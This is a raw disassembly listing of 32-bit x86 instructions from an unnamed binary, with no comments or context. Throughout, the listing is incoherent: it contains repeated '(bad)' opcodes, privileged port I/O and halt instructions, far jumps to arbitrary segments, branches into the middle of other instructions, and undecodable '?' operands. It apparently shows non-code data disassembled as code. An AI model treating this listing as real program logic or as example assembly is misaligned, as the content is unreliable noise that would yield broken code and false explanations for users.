  413733:	scas   eax,DWORD PTR es:[edi]
  413734:	mov    bh,0xeb
  413736:	std    
  413737:	sar    ch,0xb7
  41373a:	jge    0x4136eb
  41373c:	dec    ebx
  41373d:	in     eax,dx
  41373e:	xor    dl,ah
  413740:	pushf  
  413741:	popa   
  413742:	cmc    
  413743:	or     ah,BYTE PTR [edi+eax*4+0xd]
  413747:	adc    ah,BYTE PTR [edi]
  413749:	pop    DWORD PTR [esi+0x3f5e5f08]
  41374f:	stos   BYTE PTR es:[edi],al
  413750:	in     al,0x3d
  413752:	adc    ch,BYTE PTR [edi+eiz*4+0x2d8f7f51]
  413759:	inc    esp
  41375a:	popf   
  41375b:	dec    eax
  41375c:	arpl   ax,dx
  41375e:	and    ch,BYTE PTR [ecx]
  413760:	rcr    DWORD PTR es:[edi+0x2b],1
  413764:	imul   eax,DWORD PTR [ebp+0x6],0xce61f18e
  41376b:	sar    BYTE PTR [ebx-0x527286f0],cl
  413771:	jg     0x413701
  413773:	sub    ebx,DWORD PTR [ecx]
  413775:	xor    edx,esi
  413777:	dec    ebx
  413778:	dec    esi
  413779:	je     0x4137d4
  41377b:	dec    esi
  41377c:	mov    bl,0x42
  41377e:	sub    dl,bh
  413780:	ins    BYTE PTR es:[edi],dx
  413781:	sbb    eax,0xb848f1cb
  413786:	cmc    
  413787:	mov    eax,0x33edb1bc
  41378c:	mov    edx,0x180f019a
  413791:	or     al,0xee
  413793:	inc    eax
  413794:	pop    eax
  413795:	add    DWORD PTR [eax+0x1d],ebx
  413798:	pop    esi
  413799:	mov    eax,0x5f4b6d2
  41379e:	mov    ebx,0x90e0e59c
  4137a3:	dec    ebx
  4137a4:	sbb    ah,BYTE PTR [ebx-0x79f01cea]
  4137aa:	jbe    0x41378b
  4137ac:	dec    esp
  4137ad:	pop    eax
  4137ae:	je     0x4137e8
  4137b0:	xor    eax,0x62ac1a0e
  4137b5:	dec    edx
  4137b6:	xor    al,0xb2
  4137b8:	sub    eax,0x5798dd16
  4137bd:	cwde   
  4137be:	into   
  4137bf:	pop    ds
  4137c0:	fldcw  WORD PTR [edi]
  4137c2:	add    DWORD PTR [esi],0xe9f6b022
  4137c8:	repz not DWORD PTR [esi]
  4137cb:	mov    DWORD PTR [ebp-0x5c],esi
  4137ce:	ret    0x556a
  4137d1:	ja     0x413832
  4137d3:	ret    0x741b
  4137d6:	inc    esp
  4137d7:	leave  
  4137d8:	jmp    0x413777
  4137da:	add    ah,BYTE PTR [ebx]
  4137dc:	in     eax,0xc
  4137de:	xchg   esi,eax
  4137df:	shl    DWORD PTR [edi],cl
  4137e1:	hlt    
  4137e2:	stc    
  4137e3:	sbb    cl,BYTE PTR [edx+eiz*8+0x6a]
  4137e7:	or     DWORD PTR [eax-0x42e6d1ed],edx
  4137ed:	add    BYTE PTR [ebx],dl
  4137ef:	inc    edx
  4137f0:	lahf   
  4137f1:	dec    ebp
  4137f2:	bnd call 0xe6abd1b3
  4137f8:	and    eax,0xf2626ca9
  4137fd:	imul   edi,eax,0x2b
  413800:	jne    0x413793
  413802:	adc    eax,0xcecc421b
  413807:	div    DWORD PTR [edx+0x2]
  41380a:	in     eax,0xf0
  41380c:	pop    ebp
  41380d:	xchg   edx,eax
  41380e:	jns    0x4137ac
  413810:	daa    
  413811:	aaa    
  413812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413813:	inc    ecx
  413814:	jl     0x413884
  413816:	jmp    0x4137b2
  413818:	jmp    0xc99f1ec0
  41381d:	and    ch,ch
  41381f:	popa   
  413820:	xchg   edx,eax
  413821:	jne    0x4137c0
  413823:	inc    edx
  413824:	add    ah,dh
  413826:	daa    
  413827:	cmp    al,0x19
  413829:	adc    eax,0xa8a4ae09
  41382e:	sub    ah,bh
  413830:	imul   eax,edi,0xc40ecd5f
  413836:	sti    
  413837:	add    eax,DWORD PTR [eax-0x49]
  41383a:	pop    ecx
  41383b:	shl    DWORD PTR [eax+ecx*8-0x21],cl
  41383f:	jmp    0x4f8bed09
  413844:	push   ecx
  413845:	jmp    0xa016:0xf5d99f76
  41384c:	add    BYTE PTR fs:[edx],0xd8
  413850:	push   ebx
  413851:	xor    BYTE PTR [ebx],dh
  413853:	outs   dx,BYTE PTR ds:[esi]
  413854:	jp     0x41380e
  413856:	fidiv  WORD PTR [edi+eax*8-0x2]
  41385a:	sub    esp,ebp
  41385c:	cmp    BYTE PTR [ebx-0x78],cl
  41385f:	mov    esi,0xd44facdf
  413864:	repz out 0x3e,al
  413867:	js     0x4138b4
  413869:	int3   
  41386a:	iret   
  41386b:	jno    0x413844
  41386d:	(bad)  
  41386e:	cmp    eax,0xe5123e33
  413873:	sbb    BYTE PTR [ebx+0x11c01588],dh
  413879:	pop    ebp
  41387a:	or     dh,dh
  41387c:	in     al,0xe1
  41387e:	clc    
  41387f:	shl    ch,cl
  413881:	mov    BYTE PTR [ebx+ecx*4],ah
  413884:	out    0x2c,al
  413886:	jo     0x4138ed
  413888:	ds jo  0x4138fb
  41388b:	cmp    BYTE PTR [ecx+0x4e],ch
  41388e:	cld    
  41388f:	inc    edx
  413890:	and    DWORD PTR [edx+0x58ae3c69],edi
  413896:	sbb    BYTE PTR [ecx+ebx*4-0x4d],0xec
  41389b:	fs pop es
  41389d:	cli    
  41389e:	in     al,0xb9
  4138a0:	mov    bl,0x7b
  4138a2:	mov    ds:0x8c321964,al
  4138a7:	dec    edi
  4138a8:	scas   al,BYTE PTR es:[edi]
  4138a9:	mul    ecx
  4138ab:	cmc    
  4138ac:	or     DWORD PTR [edx],ebp
  4138ae:	sub    eax,0xb31a12f0
  4138b3:	jb     0x41387a
  4138b5:	mov    gs,WORD PTR [eax+ecx*1+0x1e212888]
  4138bc:	fcmovbe st,st(6)
  4138be:	pop    esi
  4138bf:	fst    QWORD PTR [ecx-0x2b]
  4138c2:	aad    0x1
  4138c4:	rcl    DWORD PTR [ebp+ebp*1+0x40be7065],cl
  4138cb:	mov    esi,0x50098d79
  4138d0:	shr    BYTE PTR [eax-0x161b40db],cl
  4138d6:	int3   
  4138d7:	(bad)  
  4138d8:	xchg   ebx,eax
  4138d9:	sbb    DWORD PTR [edx+0x4e8c0c90],ecx
  4138df:	rcr    edx,cl
  4138e1:	mov    cl,0x88
  4138e3:	mov    al,ds:0xbefd348b
  4138e8:	add    DWORD PTR [ebp-0x3e78dbd9],esi
  4138ee:	repz cmp BYTE PTR [edx+0x77],al
  4138f2:	adc    esi,DWORD PTR [esi+0x374994ae]
  4138f8:	adc    cl,BYTE PTR [ebx-0x77]
  4138fb:	mov    al,ds:0x6665906e
  413900:	jl     0x413949
  413902:	cwde   
  413903:	inc    esp
  413904:	dec    ecx
  413905:	xor    BYTE PTR [eax],dh
  413907:	retf   
  413908:	sub    DWORD PTR [ebp-0x4e],0x96807a26
  41390f:	adc    cl,BYTE PTR [edi+0x1]
  413912:	leave  
  413913:	fbstp  TBYTE PTR [edx]
  413915:	scas   eax,DWORD PTR es:[edi]
  413916:	test   DWORD PTR [ebx],esp
  413918:	mov    ?,ecx
  41391a:	stc    
  41391b:	add    al,0x33
  41391d:	jecxz  0x4138e6
  41391f:	add    DWORD PTR [ebx-0x26],0xd5763c70
  413926:	imul   ebx,ebp,0x9b098b77
  41392c:	sbb    eax,0xb1dfea32
  413931:	rol    BYTE PTR [eax+0x19],0x1b
  413935:	sbb    DWORD PTR [edi-0x49],esi
  413938:	shl    BYTE PTR [ebx],1
  41393a:	cld    
  41393b:	cmp    dh,BYTE PTR [edx-0x7d]
  41393e:	adc    edi,edi
  413940:	xchg   ebx,eax
  413941:	dec    eax
  413942:	adc    eax,0xd0deab94
  413947:	daa    
  413948:	rol    BYTE PTR [edx+0x39],cl
  41394b:	push   edi
  41394c:	mov    edx,0x13181aa9
  413951:	out    0x3f,eax
  413953:	hlt    
  413954:	dec    esi
  413955:	les    ebp,FWORD PTR [ebx-0x58]
  413958:	jmp    0x69a8:0x6429c920
  41395f:	les    esp,FWORD PTR [ecx]
  413961:	mov    WORD PTR [esp+ebp*1-0x26],es
  413965:	out    dx,al
  413966:	rcr    BYTE PTR [eax+0x65],cl
  413969:	int    0x97
  41396b:	mov    cx,0x2cf5
  41396f:	mov    eax,edi
  413971:	dec    ebx
  413972:	in     al,dx
  413973:	sbb    esi,DWORD PTR [esp+esi*8]
  413976:	xor    eax,0x4ffa27b1
  41397b:	sti    
  41397c:	and    eax,0xf9030adf
  413981:	mov    edx,0x3308d69e
  413986:	cli    
  413987:	jecxz  0x413945
  413989:	test   BYTE PTR [ecx],bh
  41398b:	popf   
  41398c:	icebp  
  41398d:	add    eax,DWORD PTR [ebx-0x7a22fb84]
  413993:	pop    esp
  413994:	adc    ah,ch
  413996:	into   
  413997:	xchg   esi,eax
  413998:	in     al,0x57
  41399a:	scas   eax,DWORD PTR es:[edi]
  41399b:	push   esi
  41399c:	test   DWORD PTR ds:0xc8b467d8,0xaaaf55ac
  4139a6:	jo     0x413934
  4139a8:	in     eax,0xf2
  4139aa:	sub    eax,0x1ff11254
  4139af:	imul   ebp,DWORD PTR [edx],0xffffffa1
  4139b2:	mov    ebp,0xef35362f
  4139b7:	neg    BYTE PTR [esi]
  4139b9:	ftst   
  4139bb:	jmp    0x41398b
  4139bd:	pop    ecx
  4139be:	call   0xd2cdd688
  4139c3:	js     0x413991
  4139c5:	lds    edi,FWORD PTR [esi]
  4139c7:	xor    DWORD PTR [esi+esi*8],0x7eb4042e
  4139ce:	cmc    
  4139cf:	ins    BYTE PTR es:[edi],dx
  4139d0:	adc    al,0x1e
  4139d2:	dec    ecx
  4139d3:	(bad)  
  4139d4:	push   ecx
  4139d5:	adc    edi,DWORD PTR [ebx+0x15]
  4139d8:	add    eax,0x385e6a2a
  4139dd:	or     cl,0xb2
  4139e0:	pop    eax
  4139e1:	add    edi,esi
  4139e3:	in     eax,0x90
  4139e5:	or     esp,DWORD PTR [ebp-0x7f]
  4139e8:	mov    ch,bl
  4139ea:	nop
  4139eb:	pop    ebx
  4139ec:	sbb    esp,DWORD PTR fs:[eax]
  4139ef:	and    dl,bh
  4139f1:	cwde   
  4139f2:	std    
  4139f3:	stc    
  4139f4:	sbb    DWORD PTR [eax],ebp
  4139f6:	mov    bl,BYTE PTR [ebx-0x10]
  4139f9:	test   dh,al
  4139fb:	cmc    
  4139fc:	clc    
  4139fd:	adc    eax,0xd7aeff0a
  413a02:	xlat   BYTE PTR ds:[ebx]
  413a03:	arpl   si,bp
  413a05:	imul   eax,eax,0xffffffe1
  413a08:	inc    esp
  413a09:	loope  0x413a4b
  413a0b:	repz rcr DWORD PTR ds:0xd8ed5a0b,0x43
  413a13:	ret    
  413a14:	dec    ebp
  413a15:	pop    ds
  413a16:	pusha  
  413a17:	fnstcw WORD PTR [edi]
  413a19:	mov    ebx,0x9201aa75
  413a1e:	ja     0x413a1e
  413a20:	cld    
  413a21:	stc    
  413a22:	fld    DWORD PTR [ebx+0x56d45f3f]
  413a28:	xchg   edi,eax
  413a29:	jae    0x4139b7
  413a2b:	(bad)  
  413a2d:	sbb    DWORD PTR [ebx],esi
  413a2f:	call   0x4ba2b92b
  413a34:	jl     0x413a32
  413a36:	sbb    al,0x75
  413a38:	dec    edx
  413a39:	test   eax,0x9273f8b0
  413a3e:	test   dh,dh
  413a40:	xchg   esp,eax
  413a41:	adc    ebp,DWORD PTR [edi-0x68ffdb27]
  413a47:	mov    dl,0x4e
  413a49:	retf   0x4501
  413a4c:	add    cl,bl
  413a4e:	dec    ebp
  413a4f:	fisubr DWORD PTR [edi]
  413a51:	sub    BYTE PTR [ecx],ah
  413a53:	jp     0x4139f2
  413a55:	scas   al,BYTE PTR es:[edi]
  413a56:	call   0x2db05107
  413a5b:	fnstenv [edi+0x4d]
  413a5e:	or     esi,esp
  413a60:	pop    eax
  413a61:	rcl    BYTE PTR [esi-0x5e],0xc7
  413a65:	out    0xe8,eax
  413a67:	mov    ebp,0xbf6a04c9
  413a6c:	ret    
  413a6d:	fwait
  413a6e:	add    BYTE PTR [edx+0x35],bl
  413a71:	cmc    
  413a72:	ins    DWORD PTR es:[edi],dx
  413a73:	push   0x2
  413a75:	or     al,0x12
  413a77:	mov    esi,0x5b629ac2
  413a7c:	sub    al,0xae
  413a7e:	aas    
  413a7f:	int    0xde
  413a81:	int3   
  413a82:	out    0xf6,eax
  413a84:	inc    edi
  413a85:	pusha  
  413a86:	sub    eax,0x34e33a7b
  413a8b:	adc    bl,ah
  413a8d:	iret   
  413a8e:	or     al,BYTE PTR [ecx]
  413a90:	outs   dx,DWORD PTR ds:[esi]
  413a91:	push   ecx
  413a92:	adc    dh,bh
  413a94:	(bad)  
  413a95:	cli    
  413a96:	lods   al,BYTE PTR ds:[esi]
  413a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a98:	popf   
  413a99:	inc    ecx
  413a9a:	mov    ?,WORD PTR [ebx]
  413a9c:	or     dl,BYTE PTR [eax]
  413a9e:	jl     0x413a58
  413aa0:	shl    DWORD PTR [esi+esi*1-0x3a71082f],cl
  413aa7:	stos   BYTE PTR es:[edi],al
  413aa8:	test   eax,0x314de4cf
  413aad:	sub    ebp,DWORD PTR [eax+0x1d]
  413ab0:	inc    ebp
  413ab1:	scas   al,BYTE PTR es:[edi]
  413ab2:	or     edx,edx
  413ab4:	xlat   BYTE PTR ds:[ebx]
  413ab5:	(bad)  
  413ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab7:	sbb    cl,dl
  413ab9:	inc    edi
  413aba:	mov    dl,0x6f
  413abc:	in     al,0x80
  413abe:	mov    al,0x38
  413ac0:	jg     0x413b27
  413ac2:	scas   eax,DWORD PTR es:[edi]
  413ac3:	sub    ch,bl
  413ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac6:	cwde   
  413ac7:	lds    ecx,FWORD PTR [esi-0x4c]
  413aca:	cmp    edx,0x1a
  413acd:	repnz push 0x149de2c3
  413ad3:	or     BYTE PTR [edi-0x7d2e24d6],dh
  413ad9:	ins    BYTE PTR es:[edi],dx
  413ada:	mov    DWORD PTR [eax],0xb690a121
  413ae0:	push   ecx
  413ae1:	push   ebp
  413ae2:	and    edx,DWORD PTR [esp+ebx*2]
  413ae5:	cmp    esp,0x8f5c46b7
  413aeb:	cli    
  413aec:	cli    
  413aed:	frstor [ebx+0x68]
  413af0:	(bad)  
  413af1:	jmp    0xe0f2:0x2c250a2a
  413af8:	lods   al,BYTE PTR ds:[esi]
  413af9:	xor    DWORD PTR ds:0xa64a0cd0,eax
  413aff:	aas    
  413b00:	stos   DWORD PTR es:[edi],eax
  413b01:	into   
  413b02:	icebp  
  413b03:	xor    eax,0x2ee84fa5
  413b08:	fst    DWORD PTR [eax-0x2a]
  413b0b:	push   cs
  413b0c:	sbb    DWORD PTR [esi+0x12],esp
  413b0f:	mov    ds:0xf3f8317f,al
  413b14:	push   edi
  413b15:	jp     0x413b59
  413b17:	pop    ebx
  413b18:	test   BYTE PTR [ebp+ebp*4-0x5e756d90],al
  413b1f:	mov    esp,edx
  413b21:	sbb    al,0x63
  413b23:	inc    esp
  413b24:	xchg   ebx,eax
  413b25:	fwait
  413b26:	sbb    ebx,esi
  413b28:	add    DWORD PTR [esi+0x1795897d],edx
  413b2e:	dec    edi
  413b2f:	imul   ecx,DWORD PTR [edi],0x62
  413b32:	jecxz  0x413b61
  413b34:	cdq    
  413b35:	push   0x207420a7
  413b3a:	popf   
  413b3b:	inc    edi
  413b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b3d:	push   ecx
  413b3e:	push   0x21c0e71a
  413b43:	jno    0x413ac6
  413b45:	inc    esp
  413b46:	ret    
  413b47:	int    0xd2
  413b49:	xor    BYTE PTR [esi+edx*1],al
  413b4c:	imul   esp,DWORD PTR [eax],0x7e
  413b4f:	std    
  413b50:	and    DWORD PTR [eax+0x49],esp
  413b53:	cmp    cl,al
  413b55:	retf   
  413b56:	in     eax,0x93
  413b58:	mov    ebp,0x57d4031a
  413b5d:	adc    ecx,ecx
  413b5f:	sbb    cl,bh
  413b61:	or     BYTE PTR [esi+0x372b5d50],bh
  413b67:	call   0x8d22:0xcb0a4314
  413b6e:	jmp    0x413b36
  413b70:	mov    bh,0xf8
  413b72:	sbb    dl,bl
  413b74:	mov    esi,0x78cfeded
  413b79:	mov    ch,0x7a
  413b7b:	jnp    0x413bfa
  413b7d:	jl     0x413bdd
  413b7f:	lods   eax,DWORD PTR ds:[esi]
  413b80:	mov    ebx,0x6f270138
  413b85:	mov    ah,0xc6
  413b87:	repnz xchg ebx,eax
  413b89:	stos   DWORD PTR es:[edi],eax
  413b8a:	or     al,0xf1
  413b8c:	or     ebp,esi
  413b8e:	ror    BYTE PTR [edx-0x50c28599],1
  413b94:	dec    ecx
  413b95:	data16 sub al,0xe3
  413b98:	outs   dx,BYTE PTR ds:[esi]
  413b99:	aad    0x7a
  413b9b:	sti    
  413b9c:	inc    edx
  413b9d:	stos   DWORD PTR es:[edi],eax
  413b9e:	xchg   ecx,eax
  413b9f:	and    ecx,ecx
  413ba1:	sub    ch,bh
  413ba3:	lea    edx,[ebx-0x13]
  413ba6:	out    dx,al
  413ba7:	ds jnp 0x413bb0
  413baa:	jae    0x413be1
  413bac:	lahf   
  413bad:	fidivr DWORD PTR [eax+0x45]
  413bb0:	jmp    0x413c06
  413bb2:	fnstenv [edi+0x62]
  413bb5:	repnz pop edi
  413bb7:	xor    ah,dl
  413bb9:	js     0x413b55
  413bbb:	cwde   
  413bbc:	fisubr DWORD PTR [eax-0x366f1ae]
  413bc2:	popf   
  413bc3:	retf   0x660e
  413bc6:	push   ecx
  413bc7:	hlt    
  413bc8:	push   edi
  413bc9:	jmp    0x413be1
  413bcb:	xchg   ecx,eax
  413bcc:	inc    ecx
  413bcd:	sbb    al,0x7c
  413bcf:	outs   dx,DWORD PTR ds:[esi]
  413bd0:	push   esp
  413bd1:	inc    esp
  413bd2:	in     eax,0x37
  413bd4:	std    
  413bd5:	lds    edi,FWORD PTR [ebx+0x2750f1c3]
  413bdb:	imul   dl
  413bdd:	mov    eax,ds:0x7bdeeb52
  413be2:	mov    edx,0x1bc1bfd8
  413be7:	jae    0x413bd1
  413be9:	or     BYTE PTR [edx],cl
  413beb:	dec    edi
  413bec:	pop    ecx
  413bed:	dec    ecx
  413bee:	out    dx,al
  413bef:	inc    ebp
  413bf0:	push   0x73b42018
  413bf5:	test   ah,al
  413bf7:	and    eax,0xaef5ad00
  413bfc:	pop    eax
  413bfd:	xor    al,0xec
  413bff:	or     al,BYTE PTR [edx]
  413c01:	jno    0x413b8b
  413c03:	ret    0x7ef
  413c06:	fs inc ebp
  413c08:	lds    ebx,FWORD PTR [ebx+0x74cd591c]
  413c0e:	add    DWORD PTR [edi],ebx
  413c10:	dec    ebx
  413c11:	sub    dl,BYTE PTR [esi]
  413c13:	inc    edi
  413c14:	cdq    
  413c15:	lahf   
  413c16:	rol    BYTE PTR [esi],cl
  413c18:	std    
  413c19:	js     0x413bdf
  413c1b:	sbb    eax,DWORD PTR ds:0x3ace5501
  413c21:	vxorps ymm5,ymm1,YMMWORD PTR [edi]
  413c25:	imul   esp,DWORD PTR [ecx+0x26a4cba8],0x40
  413c2c:	aam    0x1e
  413c2e:	pop    esp
  413c2f:	hlt    
  413c30:	fs or  al,0x46
  413c33:	pop    edi
  413c34:	fwait
  413c35:	sub    al,0xc6
  413c37:	xchg   edi,eax
  413c38:	fild   DWORD PTR [edi+0x8604eb]
  413c3e:	mov    al,dh
  413c40:	xor    eax,0xcbdb1c10
  413c45:	out    dx,al
  413c46:	and    eax,0xca35df80
  413c4b:	and    eax,0x6cfec636
  413c50:	jnp    0x413c3e
  413c52:	fs jg  0x413c1a
  413c55:	sbb    esp,DWORD PTR [edi+0x5f]
  413c58:	push   0x22a6e7db
  413c5d:	or     eax,0x88a57e3a
  413c62:	stos   BYTE PTR es:[edi],al
  413c63:	inc    ecx
  413c64:	jno    0x413c56
  413c66:	inc    edi
  413c67:	dec    ebp
  413c68:	sub    ch,al
  413c6a:	sub    BYTE PTR [esi],bl
  413c6c:	jne    0x413bfe
  413c6e:	and    eax,0x71e7b582
  413c73:	xor    DWORD PTR [ecx],eax
  413c75:	fistp  WORD PTR [esp+ecx*4]
  413c78:	cld    
  413c79:	daa    
  413c7a:	call   0x9d6afa1
  413c7f:	push   ds
  413c80:	jb     0x413c79
  413c82:	ss push esi
  413c84:	sti    
  413c85:	jge    0x413c7f
  413c87:	cmp    cl,cl
  413c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c8a:	xchg   esp,eax
  413c8b:	push   ds
  413c8c:	imul   esp,edx,0xffffff90
  413c8f:	cmp    DWORD PTR [esi],edx
  413c91:	mov    edi,eax
  413c93:	xlat   BYTE PTR ds:[ebx]
  413c94:	loop   0x413c1e
  413c96:	dec    edi
  413c97:	mov    al,0x69
  413c99:	jecxz  0x413c54
  413c9b:	cmp    dh,0x98
  413c9e:	add    si,WORD PTR [eax-0x4ede5c7c]
  413ca5:	sub    ah,bh
  413ca7:	push   edx
  413ca8:	and    ebp,DWORD PTR ds:0xa7a63d18
  413cae:	stc    
  413caf:	push   es
  413cb0:	enter  0xf5e0,0x76
  413cb4:	popa   
  413cb5:	loop   0x413c46
  413cb7:	loope  0x413ce7
  413cb9:	dec    esi
  413cba:	imul   eax,DWORD PTR [ecx],0xc21c02b9
  413cc0:	sub    ecx,DWORD PTR [eax+edi*4+0x5a]
  413cc4:	out    dx,al
  413cc5:	dec    edi
  413cc6:	mov    dh,BYTE PTR [esi+0x16]
  413cc9:	mov    cl,0xe7
  413ccb:	inc    ebp
  413ccc:	add    eax,DWORD PTR [ebp-0x4c019d66]
  413cd2:	and    ebx,ebx
  413cd4:	cmp    dl,ch
  413cd6:	cld    
  413cd7:	fcmovnbe st,st(3)
  413cd9:	pop    edx
  413cda:	fnstenv [esi+0x68]
  413cdd:	ret    0xb83b
  413ce0:	bnd je 0x413cc7
  413ce3:	inc    edx
  413ce4:	mov    edx,0xa88c456
  413ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cea:	sub    DWORD PTR [edi-0x10],edi
  413ced:	sub    BYTE PTR [ebx+0x4f281fe9],ah
  413cf3:	push   ebp
  413cf4:	outs   dx,DWORD PTR ds:[esi]
  413cf5:	outs   dx,DWORD PTR ds:[esi]
  413cf6:	adc    dh,BYTE PTR [eax-0x7e]
  413cf9:	dec    esp
  413cfa:	cmp    ebx,DWORD PTR [ebp-0x621c2105]
  413d00:	cli    
  413d01:	adc    BYTE PTR [ebp+0x19],ch
  413d04:	cli    
  413d05:	xchg   ebp,eax
  413d06:	arpl   WORD PTR [ebx+eiz*1-0x68dafe75],sp
  413d0d:	sbb    eax,0xa13574c8
  413d12:	mov    dh,0xcd
  413d14:	jae    0x413cda
  413d16:	std    
  413d17:	repz lock test al,0xfa
  413d1b:	mov    DWORD PTR [esi+0x3e],edi
  413d1e:	cmp    DWORD PTR [ecx],edx
  413d20:	jno    0x413d6c
  413d22:	xchg   esi,eax
  413d23:	repnz dec ebx
  413d25:	pop    esp
  413d26:	stos   BYTE PTR es:[edi],al
  413d27:	mov    eax,eax
  413d29:	adc    ecx,edi
  413d2b:	xchg   BYTE PTR [edx+ebp*2],ch
  413d2e:	xlat   BYTE PTR ds:[ebx]
  413d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d30:	mov    ebx,0xd2e8c08b
  413d35:	ret    0xbe73
  413d38:	in     eax,dx
  413d39:	loopne 0x413d36
  413d3b:	and    esp,ecx
  413d3d:	icebp  
  413d3e:	dec    ecx
  413d3f:	(bad)  
  413d41:	stos   DWORD PTR es:[edi],eax
  413d42:	cmp    al,0xf6
  413d44:	leave  
  413d45:	cmp    DWORD PTR [ecx],0x9554f7e4
  413d4b:	dec    esp
  413d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d4d:	popf   
  413d4e:	and    ah,BYTE PTR [ebx-0x1a]
  413d51:	sub    BYTE PTR [edx],al
  413d53:	inc    ecx
  413d54:	pop    DWORD PTR [eax+0x57887d89]
  413d5a:	imul   edx,DWORD PTR gs:[edx-0x2dc53efa],0x79
  413d62:	push   ss
  413d63:	(bad)  
  413d64:	sbb    ebp,DWORD PTR [edi+0x37]
  413d67:	fld    TBYTE PTR [edx-0x1e2d5537]
  413d6d:	pop    ebx
  413d6e:	add    BYTE PTR [eax],ah
  413d70:	push   es
  413d71:	je     0x413d10
  413d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d74:	iret   
  413d75:	cli    
  413d76:	aaa    
  413d77:	rcl    dh,0x4
  413d7a:	pop    eax
  413d7b:	sbb    ecx,edx
  413d7d:	jno    0x413d93
  413d7f:	dec    edi
  413d80:	mov    ds:0x361b50e7,al
  413d85:	loopne 0x413db9
  413d87:	jmp    0x413dd1
  413d89:	cmp    bh,BYTE PTR [ecx+0x1e01e932]
  413d8f:	fiadd  DWORD PTR [edi+0x2cc6d966]
  413d95:	jecxz  0x413d46
  413d97:	add    eax,0xe5121712
  413d9c:	aas    
  413d9d:	scas   al,BYTE PTR es:[edi]
  413d9e:	in     al,0x2
  413da0:	xor    BYTE PTR [ebp-0x5f],ah
  413da3:	dec    edx
  413da4:	push   0x18
  413da6:	cdq    
  413da7:	loop   0x413da9
  413da9:	adc    al,0x54
  413dab:	sahf   
  413dac:	jg     0x413d58
  413dae:	mov    WORD PTR [edi],?
  413db0:	add    al,0xce
  413db2:	mov    dl,0x4
  413db4:	dec    eax
  413db5:	dec    esp
  413db6:	pop    ecx
  413db7:	sahf   
  413db8:	pop    edi
  413db9:	mov    ebp,0xf469d741
  413dbe:	jg     0x413e07
  413dc0:	pop    ds
  413dc1:	adc    ah,dh
  413dc3:	xchg   eax,esi
  413dc5:	int    0x4
  413dc7:	jnp    0x413ddc
  413dc9:	and    esi,esi
  413dcb:	jle    0x413e4c
  413dcd:	out    dx,eax
  413dce:	push   cs
  413dcf:	or     al,dl
  413dd1:	xor    DWORD PTR [ecx],esp
  413dd3:	jbe    0x413dd3
  413dd5:	mov    dl,BYTE PTR [edi+0x5577e238]
  413ddb:	cmp    bh,BYTE PTR [edx-0x391bedcf]
  413de1:	test   eax,0x5d172241
  413de6:	or     al,0xb9
  413de8:	imul   esp,edi,0xffffff83
  413deb:	loope  0x413e09
  413ded:	adc    BYTE PTR [eax+eiz*8+0x5f],dl
  413df1:	push   esp
  413df2:	adc    al,0xe4
  413df4:	push   ss
  413df5:	xor    DWORD PTR [esi-0x5b55de47],ebx
  413dfb:	xchg   BYTE PTR [edx-0x1],bl
  413dfe:	mov    bl,0x47
  413e00:	enter  0x2647,0xa4
  413e04:	fsub   DWORD PTR [ebp+0x1c7a23d6]
  413e0a:	stos   BYTE PTR es:[edi],al
  413e0b:	and    edi,edi
  413e0d:	sti    
  413e0e:	xlat   BYTE PTR ds:[ebx]
  413e0f:	adc    BYTE PTR [ebx-0x408b4e8d],0x54
  413e16:	loop   0x413df4
  413e18:	xchg   DWORD PTR [esi],esi
  413e1a:	pop    edi
  413e1b:	pop    esi
  413e1c:	(bad)  
  413e1d:	inc    cx
  413e1f:	mov    ds:0xd39af274,al
  413e24:	(bad)  
  413e25:	mov    BYTE PTR [esi+0x7a10389b],al
  413e2b:	mov    edi,0x3807a8ca
  413e30:	or     DWORD PTR [esi-0x2c],eax
  413e33:	push   esi
  413e34:	xchg   esp,eax
  413e35:	cs in  eax,dx
  413e37:	xchg   ecx,eax
  413e38:	shl    dl,1
  413e3a:	mov    eax,0xb75a80f2
  413e3f:	jge    0x413e87
  413e41:	dec    ebp
  413e42:	dec    ebp
  413e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e44:	shr    ebx,1
  413e46:	sbb    DWORD PTR [ebx+0x479cc228],esp
  413e4c:	shr    bh,cl
  413e4e:	es pop ebp
  413e50:	fiadd  DWORD PTR [ebx+0x7fa974a9]
  413e56:	cmp    eax,0xdc6895f2
  413e5b:	or     BYTE PTR [esp+eiz*8-0x49],ch
  413e5f:	daa    
  413e60:	inc    edx
  413e61:	aam    0x5f
  413e63:	cmc    
  413e64:	sub    eax,0x4a70cd0f
  413e69:	inc    esi
  413e6a:	mov    bl,0x55
  413e6c:	in     al,dx
  413e6d:	sub    eax,0xedcf542
  413e72:	dec    edx
  413e73:	push   ecx
  413e74:	out    dx,al
  413e75:	loope  0x413dfa
  413e77:	mov    BYTE PTR [esi],dl
  413e79:	out    0x17,eax
  413e7b:	addr16 xchg esp,eax
  413e7d:	lods   eax,DWORD PTR ds:[esi]
  413e7e:	mov    edx,0xdd5d5ac0
  413e83:	pop    edx
  413e84:	(bad)  
  413e85:	and    DWORD PTR [esi-0x1],0xffffffc5
  413e89:	das    
  413e8a:	leave  
  413e8b:	test   BYTE PTR [ebp+0x267ad1da],0xbb
  413e92:	ret    
  413e93:	shr    DWORD PTR [edi+0x8],cl
  413e96:	out    0xba,eax
  413e98:	push   es
  413e99:	dec    ebx
  413e9a:	clc    
  413e9b:	xchg   ecx,eax
  413e9c:	into   
  413e9d:	push   eax
  413e9e:	pusha  
  413e9f:	sahf   
  413ea0:	gs lahf 
  413ea2:	stos   BYTE PTR es:[edi],al
  413ea3:	mov    WORD PTR [esi+ebx*4],ds
  413ea6:	add    DWORD PTR ds:0x487e0e9d,eax
  413eac:	icebp  
  413ead:	and    eax,DWORD PTR [eax+ecx*2-0x5d72c80b]
  413eb4:	hlt    
  413eb5:	inc    edi
  413eb6:	mov    dh,0x20
  413eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb9:	test   cl,0x63
